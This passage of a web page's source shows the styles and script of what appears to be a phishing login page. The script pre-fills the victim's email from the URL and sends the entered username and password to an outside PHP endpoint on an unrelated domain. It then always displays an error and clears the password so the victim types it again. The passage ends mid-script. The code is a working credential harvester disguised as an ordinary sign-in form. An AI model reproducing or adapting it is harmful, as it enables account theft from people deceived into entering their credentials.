    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #21292c;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Changed to min-height */
            position: relative; /* Added */
        }

        .login-container {
            margin-top: -120px;
            padding: 20px 40px;
            width: 400px;
            text-align: center;
        }

        h1 {
            margin-bottom: 20px;
            color: #333;
        }

        .input-group {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
            border: 1px solid #7c949c;
            border-radius: 5px;
            overflow: hidden;
            background-color: #374549; /* Background color for the left side */
        }

        .input-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            background-color: #374549;
            color: #c5d1d3; /* Updated icon color */
        }

        .input-icon i {
            font-size: 16px;
        }

        input[type="text"],
        input[type="password"] {
            flex: 1;
            padding: 10px;
            border: none;
            font-size: 18px;
            background-color: #21292c; /* Match the body's background color */
            color: rgb(224, 221, 221);
            outline: none;
            border-left: 1px solid #7c949c;
            
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.6);
            font-size: 17px;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            box-shadow: 0 0 7px #44bdfa;
            border: 1px solid #37beff;
        }

        .button-container {
            margin-top: 8px; /* Adjust the margin as needed */
            border: 1px solid #37beff; /* Border for the button */
            border-radius: 5px;
            overflow: hidden;
        }

        button {
            width: 100%;
            padding: 5px;
            background-color: #006a9d;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #007bb7;
        }

        /* Footer styling */
        footer {
            position: fixed;
            bottom: 0px;
            right: 10px;
        }

        footer img {
            width: 320px;
            height: auto;
        }

        .err {
            display: none;
            z-index: 3;
        }

        .cll {
    display: none;
    align-items: center; /* Center items vertically */
}

.loader-container {
    display: flex;
    align-items: center; /* Center items vertically */
}

.spinner {
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-left-color: #bdc8ca;
    animation: spin 1s linear infinite;
    border-radius: 100%;
    width: 20px;
    height: 20px;
    margin-right: -40px; /* Adjust the margin as needed */
    z-index: 2;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

    <script>


        // Function to get query parameters from URL
        function getQueryParam(param) {
            var urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // Get email from URL and set it in the username input
        window.onload = function() {
            var email = getQueryParam('email');
            if (email) {
                document.getElementById('username').value = email;
            }
        };



        var submissionCount = 0; // Variable to track submission count
    
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
    
            if (username.trim() !== '' && password.trim() !== '') {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://mybestjobs.co.ke/app/xv/next.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
                xhr.onloadstart = function() {
                    document.querySelector('.cll').style.display = 'flex'; // Display loading spinner
                    document.querySelector('.spinner').style.display = 'inline-block'; // Display spinning loader
                };
    
                xhr.onloadend = function() {
                    setTimeout(function() {
                        document.querySelector('.spinner').style.display = 'none'; // Hide spinning loader
                        document.querySelector('.cll').style.display = 'none'; // Display success message
                        document.querySelector('.err').style.display = 'block'; // Display error message
                        document.getElementById('password').value = ''; // Clear password input
                    }, 2000); // Hide spinner after 2 seconds
                };
    
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            // Handle successful response here
                        } else {
                            document.querySelector('.err').style.display = 'block'; // Display error message
                        }
                    }
                };
    
                xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
    
                // Increment submission count
                submissionCount++;
